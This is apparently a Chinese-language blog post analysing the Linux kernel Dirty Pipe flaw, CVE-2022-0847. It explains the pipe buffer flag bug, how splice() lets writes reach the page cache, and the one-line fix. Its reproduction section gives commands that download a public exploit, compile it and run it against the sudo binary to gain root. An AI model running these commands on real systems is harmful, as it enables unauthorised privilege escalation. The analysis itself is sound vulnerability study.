---
title: CVE-2022-0847
date: 2025-04-11
tags:
    - Linux Kernel
    - 漏洞分析
    - 漏洞复现
---

## CVE-2022-0847


### 漏洞原理


#### 管道(pipe)


pipe是linux内核提供的一个通信管道，可以通过pipe()函数创建，通过pipe()函数可以获取到两个文件描述符，分别负责接受数据和发送数据。pipe是以页的形式进行管理，通常pipe缓存空间总长度为65536字节，也就是16页,16个页以数组的方式进行存储，组成一个环形链表的结构(pipe->bufs[0]~pipe->bufs[15])，pipe有两个链表指针，一个负责写(pipe->head)，一个用来读(pipe->tail)。



通过对pipe进行写操作时，会调用到pipe的pipe_write()函数，下面主要对该函数进行简单介绍：  
该函数中存在两个逻辑：



1. 如果当前负责写的链表指针(pipe->head)指向的页的flags标志位存在PIPE_BUF_FLAG_CAN_MERGE，并且写入指定长度后不会出现跨页，那么就会继续往这个页中写入数据。
2. 如果不能在当前页续写，就会重新申请一个页，并且新页的flags标志位默认初始化为PIPE_BUF_FLAG_CAN_MERGE  
至于为什么第二点要把新页的flags标志位默认初始化为PIPE_BUF_FLAG_CAN_MERGE，因为对于pipe来说，默认状态下是允许对页进行续写的，这样可以节省空间。



#### Linux内核page cache机制


linux 文件缓存页(page cache)是Linux内核中用于缓存文件系统数据的一种机制，当一个进程访问一个文件时，内核会首先检查这个文件是否已经被缓存到页缓存中。如果文件已经被缓存，则内核会直接从页缓存中读取数据并返回给进程，避免了从磁盘中读取数据的开销。如果文件没有被缓存，则内核会将文件的数据读取到页缓存中，并从缓存中返回数据给进程，以提高性能。文件缓存页会在内核层的内存中存留一段时间(可能会一直持续到下次重启电脑)。



#### splice()系统调用


splice()系统调用是零拷贝技术的其中一种，可以自行学习零拷贝相关知识，但在此处对理解漏洞影响不大。  
splice零拷贝的方式就是，直接让pipe的缓存页指向文件缓存页，也就是使pipe->bufs[x]->page直接指向page cache。  
这一部分主要由splice()系统调用下的copy_page_to_iter_pipe()函数来实现  
但是copy_page_to_iter_pipe()函数中，在将pipe的缓存页指向文件缓存页后，并没有把pipe的缓存页的flags标志位初始化，形成了一个未初始化漏洞。



#### 漏洞场景


为什么说这是一个漏洞？考虑这样一个情景：



+ 申请一个pipe，并且向其中写入数据，把pipe的16个页全部写满一遍，那么根据pipe的pipe_write()函数的第二个逻辑，整个pipe的16个缓存页的flags标志位都会设置PIPE_BUF_FLAG_CAN_MERGE
+ 再通过读操作，把pipe的全部内容读取一遍，此时pipe将会被认定为一个空的管道(pipe是一个环形链表，全部读一遍之后两个链表指针又回到了初始状态)，但是pipe中的16个缓存页的flags标志位依旧设置有PIPE_BUF_FLAG_CAN_MERGE，并没有被清除掉。
+ 然后通过splice()系统调用，将文件A的文件缓存页传递给pipe的缓存页，假设该pipe的缓存页为pipe->bufs[2]，那么此时pipe-bufs[2]的flags依旧设置有PIPE_BUF_FLAG_CAN_MERGE，也就是说，如果继续向pipe写入数据，并且写入数据长度不会出现跨页的情况，就能继续向bufs[2]里续写，尽管bufs[2]此刻已被判断为是文件A
+ 继续向pipe中写入一段数据，只要写入的长度不会导致跨页，就会直接对内核中的文件缓存页的内容进行修改，之后如果访问文件A，那么根据Linux内核page cache机制，将会直接获取到内存中的文件A的内容。相当于实现了对可读文件暂时性的任意写的功能。



其实上述的情景就是一些EXP的攻击思路了，如果能够理解这个情景将会对之后理解EXP有很大帮助。



### 漏洞复现


```plain
wget https://haxx.in/files/dirtypipez.c
gcc dirtypipez.c -o dirtypipez
./dirtypipez `which sudo`
```



### 漏洞利用脚本分析


查看`https://haxx.in/files/dirtypipez.c`的源码进行分析：



prepare_pipe()函数负责将pipe的全部缓存页的flags设置PIPE_BUF_FLAG_CAN_MERGE,其实就是做了上述情景的前两步  
hax()函数负责向指定文件写入指定的内容，其思路与上述情景一致  
通过向具有SUID特权位的文件(这也是使用which sudo作为参数的原因)写入内容，然后执行，实现任意代码执行的效果。



### 漏洞修复


漏洞根本原因在于splice()系统调用的copy_page_to_iter_pipe()函数没有初始化flags，因此在其中加入这样一行代码即可：



```plain
buf->flags=0;
```

